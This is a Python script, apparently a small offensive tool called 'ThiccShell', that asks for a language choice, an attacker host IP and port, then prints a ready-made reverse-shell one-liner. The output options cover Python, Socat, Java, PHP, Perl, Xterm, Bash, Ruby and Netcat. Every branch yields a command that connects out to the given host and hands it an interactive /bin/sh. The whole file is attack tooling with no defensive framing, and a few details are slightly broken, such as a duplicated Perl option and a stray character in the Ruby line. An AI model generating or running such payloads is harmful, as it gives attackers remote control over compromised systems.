import string
from termcolor import colored
import ipaddress


banner = """""
████████╗██╗  ██╗██╗ ██████╗ ██████╗███████╗██╗  ██╗███████╗██╗     ██╗     
╚══██╔══╝██║  ██║██║██╔════╝██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
   ██║   ███████║██║██║     ██║     ███████╗███████║█████╗  ██║     ██║     
   ██║   ██╔══██║██║██║     ██║     ╚════██║██╔══██║██╔══╝  ██║     ██║     
   ██║   ██║  ██║██║╚██████╗╚██████╗███████║██║  ██║███████╗███████╗███████╗
   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
   V -> 1.0 --------------------------------------------------By ThiccSatan                       
   """""
print(colored(banner, "blue"))


print(colored("[0]Python    [3]Php    [6]Bash\n" + "[1]Socat     [4]Perl   [7]Ruby\n" + "[2]Java      [5]Xterm  [8]Netcat\n", "yellow"))

global hostip
global ip


Language = int(input("[+]select Language: "))

def ipreq():
    while True:
        try:
            hostip = input("[+]Host IP--> ")
            return ipaddress.ip_address(hostip)
        except ValueError:
            print("Not a valid IP address")
    

if Language > 9 :
    print("please select a number from the listed above")

if Language == 0:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    script = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + '"' + f"{ip}" +'"'+ "," + f"{hostport}" + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call" + '(["/bin/sh","-i"]);' + "'"
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(str(script))

if Language == 1:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = "socat tcp-connect:"+f"{ip}"+":"+f"{hostport}" + " system:/bin/sh"
    script = "".join(raw_script)
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(str(script))

if Language == 2:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = "r = Runtime.getRuntime()\n" + 'p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/' + f"{ip}" + "/" + f"{hostport}" + ';cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])\n' + "p.waitFor()"  
    script = "".join(raw_script)
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(str(script))

if Language == 3:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = "php -r '$sock=fsockopen(" + '"' + f"{ip}" + '"' + "," + f"{hostport}" + ');exec("/bin/sh -i <&3 >&3 2>&3");' + "'"
    script = raw_script
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(script)

if Language == 4:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = "perl -e 'use Socket;$i=" + '"' + f"{ip}" + '";$p=' + f"{hostport}" + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' + "'"
    script = raw_script
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(script)

if Language == 5:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = f"xterm -display {ip}:{hostport}"
    script = raw_script
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(script)

if Language == 6:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = f"bash -i >& /dev/tcp/{ip}/{hostport} 0>&1"
    script = raw_script
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(script)

if Language == 7:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = "ruby -rsocket -e'f=TCPSocket.open(" + f'"{ip}",{hostport}).to_i;exec sprintf' + '("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' + "'x"
    script = raw_script
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(script)

if Language == 8:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = f"nc -e /bin/sh {ip} {hostport}"
    script = raw_script
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(script)

if Language == 9:
    ip = ipreq()
    hostport = input("[+]Host Port--> ")
    raw_script = "perl -e 'use Socket;$i=" + '"' + f"{ip}" + '";$p=' + f"{hostport}" + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' + "'"
    script = raw_script
    print(colored("-----Payload Generated-----\n", "yellow"))
    print(script)





    